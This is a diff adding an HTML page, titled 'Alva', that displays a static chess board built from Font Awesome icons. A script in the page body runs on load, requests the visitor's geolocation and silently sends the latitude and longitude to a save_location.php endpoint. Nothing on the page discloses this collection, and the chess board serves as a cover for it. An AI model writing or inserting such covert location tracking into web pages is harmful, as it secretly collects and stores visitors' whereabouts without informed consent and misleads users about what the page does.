@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alva</title>
+    <link rel="stylesheet" href="style.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+</head>
+<body onload="getLocation()">
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+}
+</script>
+    <section class="container">
+        <div class="chess">
+            <div class="square square1 sqcg"><i class="fa-solid fa-chess-rook rook1"></i></div><div class="square square2 sqcy"><i class="fa-solid fa-chess-knight knight1"></i></div>
+            <div class="square square3 sqcg"><i class="fa-solid fa-chess-bishop bishop1"></i></div><div class="square square4 sqcy"><i class="fa-solid fa-chess-queen queen1"></i></div>
+            <div class="square square5 sqcg"><i class="fa-solid fa-chess-king king1"></i></div><div class="square square6 sqcy"><i class="fa-solid fa-chess-bishop bishop1"></i></div>
+            <div class="square square7 sqcg"><i class="fa-solid fa-chess-knight knight1"></i></div><div class="square square8 sqcy"><i class="fa-solid fa-chess-rook rook1"></i></div>
+
+            <div class="square square9 sqcy pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div><div class="square square10 sqcg pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div>
+            <div class="square square11 sqcy pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div><div class="square square12 sqcg pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div>
+            <div class="square square13 sqcy pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div><div class="square square14 sqcg pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div>
+            <div class="square square15 sqcy pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div><div class="square square16 sqcg pos1"><i class="fa-solid fa-chess-pawn pawn1"></i></div>
+
+            <div class="square square17 sqcg pos2"></div><div class="square square18 sqcy pos2"></div>
+            <div class="square square19 sqcg pos2"></div><div class="square square20 sqcy pos2"></div>
+            <div class="square square21 sqcg pos2"></div><div class="square square22 sqcy pos2"></div>
+            <div class="square square23 sqcg pos2"></div><div class="square square24 sqcy pos2"></div>
+
+            <div class="square square25 sqcy pos3"></div><div class="square square26 sqcg pos3"></div>
+            <div class="square square27 sqcy pos3"></div><div class="square square28 sqcg pos3"></div>
+            <div class="square square29 sqcy pos3"></div><div class="square square30 sqcg pos3"></div>
+            <div class="square square31 sqcy pos3"></div><div class="square square32 sqcg pos3"></div>
+
+            <div class="square square33 sqcg pos4"></div><div class="square square34 sqcy pos4"></div>
+            <div class="square square35 sqcg pos4"></div><div class="square square36 sqcy pos4"></div>
+            <div class="square square37 sqcg pos4"></div><div class="square square38 sqcy pos4"></div>
+            <div class="square square39 sqcg pos4"></div><div class="square square40 sqcy pos4"></div>
+
+            <div class="square square41 sqcy pos5"></div><div class="square square42 sqcg pos5"></div>
+            <div class="square square43 sqcy pos5"></div><div class="square square44 sqcg pos5"></div>
+            <div class="square square45 sqcy pos5"></div><div class="square square46 sqcg pos5"></div>
+            <div class="square square47 sqcy pos5"></div><div class="square square48 sqcg pos5"></div>
+
+            <div class="square square49 sqcg pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div><div class="square square50 sqcy pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div>
+            <div class="square square51 sqcg pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div><div class="square square52 sqcy pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div>
+            <div class="square square53 sqcg pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div><div class="square square54 sqcy pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div>
+            <div class="square square55 sqcg pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div><div class="square square56 sqcy pos6"><i class="fa-solid fa-chess-pawn pawn2"></i></div>
+
+            <div class="square square57 sqcy pos7"><i class="fa-solid fa-chess-rook rook2"></i></div><div class="square square58 sqcg pos7"><i class="fa-solid fa-chess-knight knight2"></i></div>
+            <div class="square square59 sqcy pos7"><i class="fa-solid fa-chess-bishop bishop2"></i></div><div class="square square60 sqcg pos7"><i class="fa-solid fa-chess-queen queen2"></i></div>
+            <div class="square square61 sqcy pos7"><i class="fa-solid fa-chess-king king2"></i></div><div class="square square62 sqcg pos7"><i class="fa-solid fa-chess-bishop bishop2"></i></div>
+            <div class="square square63 sqcy pos7"><i class="fa-solid fa-chess-knight knight2"></i></div><div class="square square64 sqcg pos7"><i class="fa-solid fa-chess-rook rook2"></i></div>
+
+
+        </div>
+    </section>
+    
+
+<script src="main.js"></script>
+
+</body>
+</html>
